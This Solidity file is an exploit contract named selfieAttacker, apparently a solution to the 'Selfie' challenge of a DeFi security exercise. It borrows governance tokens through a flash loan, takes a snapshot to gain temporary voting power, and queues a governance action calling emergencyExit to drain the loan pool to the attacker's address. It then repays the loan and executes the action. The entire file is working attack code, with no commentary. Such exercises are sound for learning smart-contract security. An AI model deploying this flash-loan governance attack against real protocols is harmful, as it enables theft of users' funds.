//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//import "../selfie/ISimpleGovernance.sol";
//import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function snapshot() external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IGOV {
    function getGovernanceToken() external view returns (address);
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
    function executeAction(uint256 actionId) external payable returns (bytes memory returndata);
}

contract selfieAttacker {
    address private owner;
    address private loanPool;
    address private governance;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address _owner, address _loanPool, address _governance) {
        owner = _owner;
        loanPool = _loanPool;
        governance = _governance;
    }

    function takeLoan(uint256 _amount) external {
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", owner);
        (bool success,) = loanPool.call(abi.encodeWithSignature("flashLoan(address,address,uint256,bytes)", address(this), IGOV(governance).getGovernanceToken(), _amount, data));
        require(success, "SelfiePool: Failed to take flash loan");
    }

    function onFlashLoan(
        address _initiator,
        address _token,
        uint256 _amount,
        uint256 _fee,
        bytes calldata _data
    ) external returns (bytes32) {
        require(msg.sender == loanPool, "SelfiePool: Flash loan must come from loan pool");
        require(_initiator == address(this), "SelfiePool: Flash loan initiated by someone other than this contract");
        IERC20(_token).snapshot();
        (bool success,) = governance.call(abi.encodeWithSignature("queueAction(address,uint128,bytes)", loanPool, uint128(0), _data));
        require(success, "SelfiePool: Failed to queue action");
        IERC20(_token).approve(loanPool, _amount + _fee);
        return  CALLBACK_SUCCESS;
    }

    function execute() external {
        IGOV(governance).executeAction(1);
    }
}